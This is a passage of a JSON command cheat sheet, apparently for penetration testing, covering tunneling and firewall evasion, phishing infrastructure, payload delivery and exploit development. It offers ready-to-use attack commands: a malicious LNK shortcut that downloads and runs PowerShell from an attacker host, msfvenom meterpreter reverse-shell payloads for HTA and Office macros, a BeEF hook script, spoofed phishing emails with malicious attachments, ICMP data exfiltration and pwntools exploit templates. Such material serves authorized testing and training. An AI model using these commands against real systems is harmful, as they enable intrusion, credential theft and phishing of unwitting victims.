            "title": "Base64 Decode (PowerShell)",
            "cmd": "powershell -c \"[IO.File]::WriteAllBytes('C:\\Temp\\file.exe',[Convert]::FromBase64String('<BASE64_STRING>'))\"",
            "tags": [
              "essential"
            ],
            "desc": "Base64 decode and write file on Windows"
          },
          {
            "title": "xxd Hex Encode",
            "cmd": "xxd -p file.bin > file.hex",
            "tags": [
              "tool"
            ],
            "desc": "Convert file to hex representation for transfer"
          },
          {
            "title": "xxd Hex Decode",
            "cmd": "xxd -r -p file.hex > file.bin",
            "tags": [
              "tool"
            ],
            "desc": "Reconstruct file from hex dump"
          },
          {
            "title": "Steghide Embed Data",
            "cmd": "steghide embed -cf cover_image.jpg -ef secret.txt -p <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Hide a file inside an image using steganography"
          },
          {
            "title": "Steghide Extract Data",
            "cmd": "steghide extract -sf stego_image.jpg -p <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Extract hidden data from a steganographic image"
          },
          {
            "title": "Exiftool Embed in Metadata",
            "cmd": "exiftool -Comment='<DATA>' image.jpg",
            "tags": [
              "advanced"
            ],
            "desc": "Embed data in image EXIF metadata"
          },
          {
            "title": "Exiftool Read Metadata",
            "cmd": "exiftool image.jpg",
            "tags": [
              "tool"
            ],
            "desc": "Read all metadata from a file"
          }
        ]
      }
    ]
  },
  {
    "id": "dpi-evasion",
    "name": "Protocol Tunneling & Firewall Evasion",
    "icon": "🔐",
    "description": "Bypass firewalls and deep packet inspection using protocol tunneling techniques",
    "subcategories": [
      {
        "name": "HTTP/HTTPS Tunneling",
        "commands": [
          {
            "title": "Chisel Server (Attacker)",
            "cmd": "chisel server --reverse --port 8080",
            "tags": [
              "essential"
            ],
            "desc": "Start Chisel server in reverse mode for client connections"
          },
          {
            "title": "Chisel Client Reverse SOCKS",
            "cmd": "chisel client <ATTACKER_IP>:8080 R:socks",
            "tags": [
              "essential"
            ],
            "desc": "Create reverse SOCKS5 proxy through Chisel"
          },
          {
            "title": "Chisel Client Reverse Port Forward",
            "cmd": "chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Reverse port forward a specific service through Chisel"
          },
          {
            "title": "Chisel Client Forward SOCKS",
            "cmd": "chisel client <ATTACKER_IP>:8080 socks",
            "tags": [
              "tool"
            ],
            "desc": "Create forward SOCKS proxy through Chisel"
          },
          {
            "title": "Chisel Client (HTTPS)",
            "cmd": "chisel client --tls-skip-verify https://<ATTACKER_IP>:8443 R:socks",
            "tags": [
              "advanced"
            ],
            "desc": "Tunnel Chisel through HTTPS to evade DPI"
          },
          {
            "title": "HTTPTunnel Server (Attacker)",
            "cmd": "hts -F 127.0.0.1:<LOCAL_PORT> <LISTEN_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Start HTTPTunnel server forwarding to a local service"
          },
          {
            "title": "HTTPTunnel Client (Target)",
            "cmd": "htc -F <LOCAL_PORT> <ATTACKER_IP>:<LISTEN_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Connect through HTTPTunnel from target"
          },
          {
            "title": "Neo-reGeorg Generate Tunnel",
            "cmd": "python3 neoreg.py generate -k <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Generate web shell tunnel files for various languages"
          },
          {
            "title": "Neo-reGeorg Connect",
            "cmd": "python3 neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php",
            "tags": [
              "advanced"
            ],
            "desc": "Connect to deployed Neo-reGeorg web tunnel"
          },
          {
            "title": "Tunna Setup",
            "cmds": [
              "# Upload conn.aspx/conn.php to target web server",
              "python2 proxy.py -u http://<TARGET_IP>/conn.php -l <LOCAL_PORT> -r <REMOTE_PORT> -a <TARGET_INTERNAL_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "HTTP tunnel via deployed web shell for port forwarding"
          },
          {
            "title": "ABPTTS Tunnel",
            "cmds": [
              "python2 abpttsfactory.py -o webshell",
              "# Upload generated webshell to target",
              "python2 abpttsclient.py -c config.txt -u http://<TARGET_IP>/abptts.aspx -f 127.0.0.1:<LOCAL_PORT>/<TARGET_INTERNAL_IP>:<REMOTE_PORT>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "TCP tunneling over HTTP using ABPTTS"
          }
        ]
      },
      {
        "name": "DNS Tunneling",
        "commands": [
          {
            "title": "dnscat2 Server",
            "cmd": "ruby dnscat2.rb <ATTACKER_DOMAIN> --secret=<SECRET>",
            "tags": [
              "essential"
            ],
            "desc": "Start dnscat2 C2 server listening for DNS queries"
          },
          {
            "title": "dnscat2 Client",
            "cmd": "dnscat --secret=<SECRET> <ATTACKER_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Connect to dnscat2 server from target via DNS"
          },
          {
            "title": "dnscat2 PowerShell Client",
            "cmd": "Start-Dnscat2 -Domain <ATTACKER_DOMAIN> -PreSharedSecret <SECRET>",
            "tags": [
              "tool"
            ],
            "desc": "Connect to dnscat2 from Windows via PowerShell"
          },
          {
            "title": "Iodine Server",
            "cmd": "sudo iodined -f -c -P <PASSWORD> 10.0.0.1/24 <TUNNEL_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Start iodine DNS tunnel server with virtual IP range"
          },
          {
            "title": "Iodine Client",
            "cmd": "sudo iodine -f -P <PASSWORD> <TUNNEL_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Connect to iodine DNS tunnel from target"
          },
          {
            "title": "dns2tcp Server",
            "cmd": "dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf",
            "tags": [
              "tool"
            ],
            "desc": "Start dns2tcp daemon for DNS tunneling"
          },
          {
            "title": "dns2tcp Client",
            "cmd": "dns2tcpc -r ssh -z <ATTACKER_DOMAIN> <DNS_SERVER> -l <LOCAL_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Connect to dns2tcp and forward SSH through DNS"
          }
        ]
      },
      {
        "name": "ICMP Tunneling",
        "commands": [
          {
            "title": "icmpsh Server (Attacker)",
            "cmds": [
              "sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1",
              "python3 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start ICMP shell listener (disable kernel ICMP replies first)"
          },
          {
            "title": "icmpsh Client (Windows Target)",
            "cmd": "icmpsh.exe -t <ATTACKER_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Connect ICMP reverse shell from Windows target"
          },
          {
            "title": "ptunnel-ng Server",
            "cmd": "sudo ptunnel-ng -r<ATTACKER_IP> -R22",
            "tags": [
              "essential"
            ],
            "desc": "Start ICMP tunnel server forwarding to SSH"
          },
          {
            "title": "ptunnel-ng Client",
            "cmd": "sudo ptunnel-ng -p<ATTACKER_IP> -l<LOCAL_PORT> -r<TARGET_IP> -R<REMOTE_PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Connect through ICMP tunnel to reach remote service"
          },
          {
            "title": "Nping ICMP Data Exfil",
            "cmd": "nping --icmp -c 1 --data-string '<DATA>' <ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Embed data in ICMP packets via nping"
          }
        ]
      },
      {
        "name": "Deep Packet Inspection Bypass",
        "commands": [
          {
            "title": "stunnel Client Config",
            "cmds": [
              "# stunnel.conf:",
              "# [tunnel]",
              "# client = yes",
              "# accept = 127.0.0.1:<LOCAL_PORT>",
              "# connect = <ATTACKER_IP>:<REMOTE_PORT>",
              "stunnel /etc/stunnel/stunnel.conf"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Wrap arbitrary TCP traffic in SSL using stunnel"
          },
          {
            "title": "OpenSSL as Encrypted Tunnel",
            "cmds": [
              "# On attacker (server):",
              "openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>",
              "# On target (client):",
              "openssl s_client -quiet -connect <ATTACKER_IP>:<PORT>"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create an encrypted communication channel via OpenSSL"
          },
          {
            "title": "Socat SSL Tunnel (Server)",
            "cmd": "socat OPENSSL-LISTEN:<PORT>,cert=server.pem,cafile=client.crt,reuseaddr,fork TCP4:127.0.0.1:<LOCAL_PORT>",
            "tags": [
              "advanced"
            ],
            "desc": "Create an SSL listener that forwards to a local service"
          },
          {
            "title": "Socat SSL Tunnel (Client)",
            "cmd": "socat TCP4-LISTEN:<LOCAL_PORT>,reuseaddr,fork OPENSSL:<ATTACKER_IP>:<PORT>,cert=client.pem,cafile=server.crt",
            "tags": [
              "advanced"
            ],
            "desc": "Connect to a socat SSL tunnel and expose locally"
          },
          {
            "title": "SSH Over HTTP (corkscrew)",
            "cmd": "ssh -o ProxyCommand='corkscrew <PROXY_IP> <PROXY_PORT> %h %p' <USER>@<ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Tunnel SSH through an HTTP proxy using corkscrew"
          },
          {
            "title": "SSH Dynamic SOCKS (DPI Evasion)",
            "cmd": "ssh -D 1080 -o 'ProxyCommand=openssl s_client -quiet -connect <ATTACKER_IP>:443' <USER>@127.0.0.1",
            "tags": [
              "advanced"
            ],
            "desc": "Dynamic SOCKS proxy over SSL-wrapped SSH to evade DPI"
          }
        ]
      }
    ]
  },
  {
    "id": "social-eng",
    "name": "Social Engineering & Phishing",
    "icon": "🎣",
    "description": "Phishing infrastructure, credential harvesting, and social engineering tools",
    "subcategories": [
      {
        "name": "Phishing Infrastructure",
        "commands": [
          {
            "title": "GoPhish Launch",
            "cmd": "sudo ./gophish",
            "tags": [
              "essential"
            ],
            "desc": "Start GoPhish phishing framework (default admin: https://127.0.0.1:3333)"
          },
          {
            "title": "SET (Social Engineering Toolkit)",
            "cmd": "sudo setoolkit",
            "tags": [
              "essential"
            ],
            "desc": "Launch the Social Engineering Toolkit interactive menu"
          },
          {
            "title": "SET Website Clone + Credential Harvest",
            "cmds": [
              "# In setoolkit:",
              "# 1) Social-Engineering Attacks",
              "# 2) Website Attack Vectors",
              "# 3) Credential Harvester Attack Method",
              "# 2) Site Cloner",
              "# Enter your IP and target URL"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Clone a website and capture submitted credentials"
          },
          {
            "title": "King Phisher Server",
            "cmd": "sudo king-phisher-server -L INFO",
            "tags": [
              "tool"
            ],
            "desc": "Start King Phisher phishing campaign server"
          },
          {
            "title": "Evilginx2 Launch",
            "cmd": "sudo evilginx2 -p /path/to/phishlets",
            "tags": [
              "essential"
            ],
            "desc": "Start Evilginx2 reverse proxy for session hijacking phishing"
          },
          {
            "title": "Evilginx2 Setup Phishlet",
            "cmds": [
              "config domain <PHISHING_DOMAIN>",
              "config ip <ATTACKER_IP>",
              "phishlets hostname <PHISHLET_NAME> <PHISHING_SUBDOMAIN>",
              "phishlets enable <PHISHLET_NAME>",
              "lures create <PHISHLET_NAME>",
              "lures get-url <LURE_ID>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Configure Evilginx2 phishlet for MitM credential and session capture"
          },
          {
            "title": "Modlishka Launch",
            "cmd": "sudo ./Modlishka -config modlishka.json",
            "tags": [
              "advanced"
            ],
            "desc": "Start Modlishka reverse proxy phishing framework"
          },
          {
            "title": "Simple HTTPS Phishing Server",
            "cmd": "python3 -m http.server 443 --directory /path/to/phishing/site/",
            "tags": [
              "tool"
            ],
            "desc": "Quick and dirty hosting for phishing pages"
          },
          {
            "title": "Evilginx2 Start",
            "desc": "Launch reverse proxy phishing",
            "cmd": "sudo evilginx2 -p /opt/evilginx2/phishlets",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Email Reconnaissance",
        "commands": [
          {
            "title": "Check SPF Record",
            "cmd": "dig TXT <DOMAIN> | grep spf",
            "tags": [
              "essential"
            ],
            "desc": "Check the SPF record for email sender validation"
          },
          {
            "title": "Check DKIM Record",
            "cmd": "dig TXT selector1._domainkey.<DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Look up DKIM selector DNS record"
          },
          {
            "title": "Check DMARC Record",
            "cmd": "dig TXT _dmarc.<DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Check DMARC policy for the target domain"
          },
          {
            "title": "Check MX Records",
            "cmd": "dig MX <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Look up mail exchange servers for the domain"
          },
          {
            "title": "Full Email Security Check",
            "cmds": [
              "dig MX <DOMAIN> +short",
              "dig TXT <DOMAIN> | grep -i spf",
              "dig TXT _dmarc.<DOMAIN> +short",
              "dig TXT selector1._domainkey.<DOMAIN> +short"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Comprehensive email security record enumeration"
          },
          {
            "title": "Verify Email via SMTP",
            "cmds": [
              "swaks --to <EMAIL> --server <MX_SERVER> --quit-after RCPT"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Verify if an email address exists via SMTP RCPT TO"
          },
          {
            "title": "theHarvester Email Enum",
            "cmd": "theHarvester -d <DOMAIN> -b google,linkedin,bing -l 500",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate email addresses from public sources"
          }
        ]
      },
      {
        "name": "Credential Harvesting",
        "commands": [
          {
            "title": "SWAKS SMTP Test",
            "cmd": "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Important Update' --body 'Please visit http://<ATTACKER_IP>/login'",
            "tags": [
              "essential"
            ],
            "desc": "Send a test phishing email via SMTP"
          },
          {
            "title": "SWAKS with Attachment",
            "cmd": "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Invoice' --body 'See attached.' --attach /path/to/payload.docm",
            "tags": [
              "tool"
            ],
            "desc": "Send phishing email with malicious attachment"
          },
          {
            "title": "BeEF Hook Script",
            "cmd": "<script src=\"http://<ATTACKER_IP>:3000/hook.js\"></script>",
            "tags": [
              "tool"
            ],
            "desc": "Browser Exploitation Framework hook to inject in phishing pages"
          },
          {
            "title": "BeEF Start",
            "cmd": "sudo beef-xss",
            "tags": [
              "tool"
            ],
            "desc": "Start the Browser Exploitation Framework"
          },
          {
            "title": "PHP Credential Logger",
            "cmd": "php -S 0.0.0.0:80 -t /path/to/phishing/site/",
            "tags": [
              "tool"
            ],
            "desc": "Serve phishing page with PHP backend for credential capture"
          },
          {
            "title": "Responder for WPAD Capture",
            "cmd": "sudo responder -I <INTERFACE> -wFb",
            "tags": [
              "tool"
            ],
            "desc": "Capture credentials via WPAD proxy auto-discovery"
          }
        ]
      },
      {
        "name": "Payload Delivery",
        "commands": [
          {
            "title": "HTA Payload Generator (msfvenom)",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh -o payload.hta",
            "tags": [
              "essential"
            ],
            "desc": "Generate an HTA file that executes PowerShell meterpreter"
          },
          {
            "title": "Macro Payload (msfvenom)",
            "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba-exe",
            "tags": [
              "essential"
            ],
            "desc": "Generate VBA macro code for embedding in Office documents"
          },
          {
            "title": "VBA Macro Payload (Raw PS)",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba",
            "tags": [
              "tool"
            ],
            "desc": "Generate VBA payload for macro-enabled documents"
          },
          {
            "title": "URL File Payload",
            "cmds": [
              "# Create a .url file:",
              "echo '[InternetShortcut]' > payload.url",
              "echo 'URL=file://<ATTACKER_IP>/share/payload.exe' >> payload.url"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create a .url file pointing to a remote payload"
          },
          {
            "title": "LNK Payload (PowerShell)",
            "cmd": "powershell -c \"$s=New-Object -ComObject WScript.Shell;$sc=$s.CreateShortcut('C:\\Temp\\legit.lnk');$sc.TargetPath='powershell.exe';$sc.Arguments='-w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')';$sc.IconLocation='C:\\Windows\\System32\\shell32.dll,3';$sc.Save()\"",
            "tags": [
              "advanced"
            ],
            "desc": "Create a malicious LNK shortcut with hidden PowerShell execution"
          },
          {
            "title": "URL Shortener with Redirect",
            "cmd": "# Use services like bit.ly / tinyurl to mask phishing URLs",
            "tags": [
              "tool"
            ],
            "desc": "Shorten and cloak phishing URLs for click-through"
          },
          {
            "title": "Generate Office Macro (Unicorn)",
            "cmd": "python3 unicorn.py windows/meterpreter/reverse_tcp <ATTACKER_IP> <PORT> macro",
            "tags": [
              "tool"
            ],
            "desc": "Generate obfuscated PowerShell macro payload with Unicorn"
          },
          {
            "title": "ISO Payload Container",
            "cmds": [
              "# Package payload inside an ISO to bypass MOTW:",
              "mkisofs -o payload.iso -J -r /path/to/payload/"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Package payload in ISO to bypass Mark of the Web"
          }
        ]
      },
      {
        "name": "OSINT & Pretexting",
        "commands": [
          {
            "title": "Sherlock Username Search",
            "desc": "Find username across networks",
            "cmd": "python3 sherlock.py <USERNAME>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Holehe Email Check",
            "desc": "Check email registrations",
            "cmd": "holehe <EMAIL>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CrossLinked LinkedIn",
            "desc": "Scrape LinkedIn for names",
            "cmd": "crosslinked -f '{first}.{last}@<DOMAIN>' '<COMPANY>'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "swaks SMTP Test",
            "desc": "Send test email",
            "cmd": "swaks --to <EMAIL> --from test@test.com --server <SMTP_SERVER> --body 'Test'",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "exploit-dev",
    "name": "Exploit Research & Development",
    "icon": "💣",
    "description": "Find, adapt, compile, and develop exploits for penetration testing",
    "subcategories": [
      {
        "name": "Finding Public Exploits",
        "commands": [
          {
            "title": "SearchSploit Basic Search",
            "cmd": "searchsploit <KEYWORD>",
            "tags": [
              "essential"
            ],
            "desc": "Search Exploit-DB for exploits matching a keyword"
          },
          {
            "title": "SearchSploit Exact Title Match",
            "cmd": "searchsploit -t <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Search only in exploit titles for exact matches"
          },
          {
            "title": "SearchSploit Copy Exploit",
            "cmd": "searchsploit -m <EXPLOIT_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Copy an exploit to the current working directory"
          },
          {
            "title": "SearchSploit Examine Exploit",
            "cmd": "searchsploit -x <EXPLOIT_PATH>",
            "tags": [
              "essential"
            ],
            "desc": "View the exploit code without copying"
          },
          {
            "title": "SearchSploit Update Database",
            "cmd": "searchsploit --update",
            "tags": [
              "essential"
            ],
            "desc": "Update the local Exploit-DB database"
          },
          {
            "title": "SearchSploit JSON Output",
            "cmd": "searchsploit -j <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Output search results in JSON format"
          },
          {
            "title": "SearchSploit Exclude Terms",
            "cmd": "searchsploit <KEYWORD> --exclude='DoS'",
            "tags": [
              "tool"
            ],
            "desc": "Search but exclude denial of service exploits"
          },
          {
            "title": "SearchSploit by Platform",
            "cmd": "searchsploit -p linux <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Filter exploits by platform"
          },
          {
            "title": "GitHub CVE Search",
            "cmd": "# Search github.com/topics/<CVE_ID> or github.com/search?q=<CVE_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Search GitHub for CVE proof-of-concept exploits"
          },
          {
            "title": "Google Dork for Exploits",
            "cmd": "# site:github.com inurl:CVE-<YEAR>-<ID> OR site:exploit-db.com <SOFTWARE> <VERSION>",
            "tags": [
              "tool"
            ],
            "desc": "Google dork to find public exploits across the web"
          }
        ]
      },
      {
        "name": "Adapting & Compiling",
        "commands": [
          {
            "title": "Cross-Compile for Windows x64",
            "cmd": "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for 64-bit Windows from Linux"
          },
          {
            "title": "Cross-Compile for Windows x86",
            "cmd": "i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for 32-bit Windows from Linux"
          },
          {
            "title": "Compile for Linux x64",
            "cmd": "gcc exploit.c -o exploit",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for Linux 64-bit"
          },
          {
            "title": "Compile for Linux x86",
            "cmd": "gcc -m32 exploit.c -o exploit",
            "tags": [
              "tool"
            ],
            "desc": "Compile C exploit for Linux 32-bit"
          },
          {
            "title": "Static Compile (No Dependencies)",
            "cmd": "gcc exploit.c -o exploit -static",
            "tags": [
              "essential"
            ],
            "desc": "Statically link exploit to avoid library dependency issues"
          },
          {
            "title": "Python 2 to 3 Conversion",
            "cmd": "2to3 -w exploit.py",
            "tags": [
              "essential"
            ],
            "desc": "Convert Python 2 exploit to Python 3 syntax"
          },
          {
            "title": "Install Python Dependencies",
            "cmd": "pip3 install requests pycryptodome impacket",
            "tags": [
              "tool"
            ],
            "desc": "Install common Python modules needed by exploits"
          },
          {
            "title": "Compile with Debug Symbols",
            "cmd": "gcc -g exploit.c -o exploit",
            "tags": [
              "tool"
            ],
            "desc": "Compile with debug info for troubleshooting"
          },
          {
            "title": "Cross-Compile (Static Windows)",
            "cmd": "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -static",
            "tags": [
              "tool"
            ],
            "desc": "Statically compile for Windows to avoid DLL issues"
          },
          {
            "title": "Compile C++ Exploit",
            "cmd": "g++ exploit.cpp -o exploit -lstdc++",
            "tags": [
              "tool"
            ],
            "desc": "Compile a C++ exploit for Linux"
          }
        ]
      },
      {
        "name": "Buffer Overflow Basics",
        "commands": [
          {
            "title": "Generate Cyclic Pattern",
            "cmd": "msf-pattern_create -l <LENGTH>",
            "tags": [
              "essential"
            ],
            "desc": "Generate a unique pattern for offset identification"
          },
          {
            "title": "Find Pattern Offset",
            "cmd": "msf-pattern_offset -l <LENGTH> -q <EIP_VALUE>",
            "tags": [
              "essential"
            ],
            "desc": "Calculate the exact offset from a pattern match in EIP/RIP"
          },
          {
            "title": "Generate Bad Characters",
            "cmd": "python3 -c \"import sys; sys.stdout.buffer.write(bytes(range(1,256)))\" > badchars.bin",
            "tags": [
              "essential"
            ],
            "desc": "Generate all byte values (0x01-0xFF) for bad character analysis"
          },
          {
            "title": "msfvenom Bad Char Shellcode",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b '\\x00\\x0a\\x0d' -f python -v shellcode",
            "tags": [
              "essential"
            ],
            "desc": "Generate shellcode excluding specified bad characters"
          },
          {
            "title": "Mona Find JMP ESP",
            "cmd": "!mona find -s '\\xff\\xe4' -m <MODULE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Find JMP ESP instruction address in a loaded module",
            "note": "Run inside Immunity Debugger"
          },
          {
            "title": "Mona List Modules",
            "cmd": "!mona modules",
            "tags": [
              "essential"
            ],
            "desc": "List all loaded modules with memory protections (ASLR, DEP, etc.)"
          },
          {
            "title": "Mona Generate Bytearray",
            "cmd": "!mona bytearray -cpb '\\x00'",
            "tags": [
              "essential"
            ],
            "desc": "Generate a byte array excluding null bytes for bad char testing"
          },
          {
            "title": "Mona Compare Bytearray",
            "cmd": "!mona compare -f C:\\mona\\bytearray.bin -a <ESP_ADDRESS>",
            "tags": [
              "essential"
            ],
            "desc": "Compare memory with bytearray to identify bad characters"
          },
          {
            "title": "Mona Suggest Gadgets (ROP)",
            "cmd": "!mona rop -m <MODULE_NAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Find ROP gadgets for DEP bypass"
          },
          {
            "title": "Check Binary Protections",
            "cmd": "checksec --file=<BINARY>",
            "tags": [
              "essential"
            ],
            "desc": "Check NX, ASLR, PIE, canary, and RELRO protections"
          },
          {
            "title": "Pattern Create",
            "desc": "Generate unique pattern",
            "cmd": "msf-pattern_create -l <LENGTH>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Pattern Offset",
            "desc": "Find EIP offset",
            "cmd": "msf-pattern_offset -l <LENGTH> -q <EIP_VALUE>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Checksec",
            "desc": "Check binary protections",
            "cmd": "checksec --file=<BINARY>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "ROPgadget",
            "desc": "Find ROP gadgets",
            "cmd": "ROPgadget --binary <BINARY> | grep 'pop rdi'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "one_gadget",
            "desc": "Find magic gadgets",
            "cmd": "one_gadget /lib/x86_64-linux-gnu/libc.so.6",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "GDB with GEF",
            "desc": "Debug with GEF",
            "cmds": [
              "gdb -q <BINARY>",
              "# checksec, vmmap, pattern create, pattern search"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Scripting Exploits",
        "commands": [
          {
            "title": "Python struct.pack (Little Endian)",
            "cmd": "python3 -c \"import struct; print(struct.pack('<I', 0x<ADDRESS>))\"",
            "tags": [
              "essential"
            ],
            "desc": "Pack an address in little-endian format for exploit payload"
          },
          {
            "title": "Python struct.pack (64-bit)",
            "cmd": "python3 -c \"import struct; print(struct.pack('<Q', 0x<ADDRESS>))\"",
            "tags": [
              "tool"
            ],
            "desc": "Pack a 64-bit address in little-endian format"
          },
          {
            "title": "Pwntools Basic Template",
            "cmds": [
              "from pwn import *",
              "context.binary = ELF('./<BINARY>')",
              "p = process('./<BINARY>')  # or remote('<TARGET_IP>', <PORT>)",
              "payload = b'A' * <OFFSET>",
              "payload += p64(<RETURN_ADDRESS>)",
              "p.sendline(payload)",
              "p.interactive()"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Basic pwntools exploit template for buffer overflows"
          },
          {
            "title": "Pwntools Remote Exploit",
            "cmd": "python3 -c \"from pwn import *; r=remote('<TARGET_IP>',<PORT>); r.sendline(b'A'*<OFFSET> + p64(<ADDRESS>)); r.interactive()\"",
            "tags": [
              "essential"
            ],
            "desc": "Quick one-liner remote exploit with pwntools"
          },
          {
            "title": "Pwntools Shellcraft",
            "cmds": [
              "from pwn import *",
              "context.arch = 'amd64'  # or 'i386'",
              "shellcode = asm(shellcraft.sh())",
              "print(f'Shellcode length: {len(shellcode)}')"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Generate shellcode using pwntools shellcraft"
          },
          {
            "title": "Pwntools Find ROP Gadgets",
            "cmds": [
              "from pwn import *",
              "elf = ELF('./<BINARY>')",
              "rop = ROP(elf)",
              "print(rop.dump())"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Enumerate ROP gadgets with pwntools"
          },
          {
            "title": "Python Socket Exploit Template",
            "cmds": [
              "import socket",
              "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
              "s.connect(('<TARGET_IP>', <PORT>))",
              "payload = b'A' * <OFFSET> + b'<SHELLCODE>'",
              "s.send(payload)",
              "s.close()"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Basic Python socket template for network exploits"
          },
          {
            "title": "Generate NOP Sled",
            "cmd": "python3 -c \"print(b'\\x90' * <LENGTH>)\"",
            "tags": [
              "essential"
            ],
            "desc": "Generate a NOP sled for shellcode alignment"
          }
        ]
      }
    ]
  },
  {
    "id": "pentest-workflow",
    "name": "Engagement Methodology & Playbook",
    "icon": "🧩",
    "description": "Structured pentest workflow, service checklists, and engagement methodology",
    "subcategories": [
      {
        "name": "Phase 1 — Reconnaissance Checklist",
        "commands": [
          {
            "title": "Full Nmap Workflow — Discovery",
            "cmd": "nmap -sn <TARGET_RANGE> -oG discovery.gnmap",
            "tags": [
              "essential"
            ],
            "desc": "Step 1: Host discovery scan across the target range"
          },
          {
            "title": "Full Nmap Workflow — All Ports",
            "cmd": "nmap -p- --min-rate 5000 -oN allports.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 2: Scan all 65535 TCP ports quickly"
          },
          {
            "title": "Full Nmap Workflow — Service Enum",
            "cmd": "nmap -sC -sV -p<OPEN_PORTS> -oN services.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 3: Service version and default script scan on open ports"
          },
          {
            "title": "Full Nmap Workflow — Vuln Scan",
            "cmd": "nmap --script vuln -p<OPEN_PORTS> -oN vulns.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 4: Run vulnerability scripts against discovered services"
          },
          {
            "title": "Full Nmap Workflow — UDP Top Ports",
            "cmd": "sudo nmap -sU --top-ports 50 --min-rate 5000 -oN udp.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 5: Quick scan of top UDP ports"
          },
          {
            "title": "Web Enum — Identify Technology",
            "cmd": "whatweb http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 1: Identify web technologies, CMS, and frameworks"
          },
          {
            "title": "Web Enum — Directory Brute Force",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o dirs.txt",
            "tags": [
              "essential"
            ],
            "desc": "Step 2: Brute force directories and files"
          },
          {
            "title": "Web Enum — Nikto Scan",
            "cmd": "nikto -h http://<TARGET_IP> -o nikto.txt",
            "tags": [
              "essential"
            ],
            "desc": "Step 3: Automated web vulnerability scanning"
          },
          {
            "title": "Web Enum — Virtual Host Discovery",
            "cmd": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
            "tags": [
              "tool"
            ],
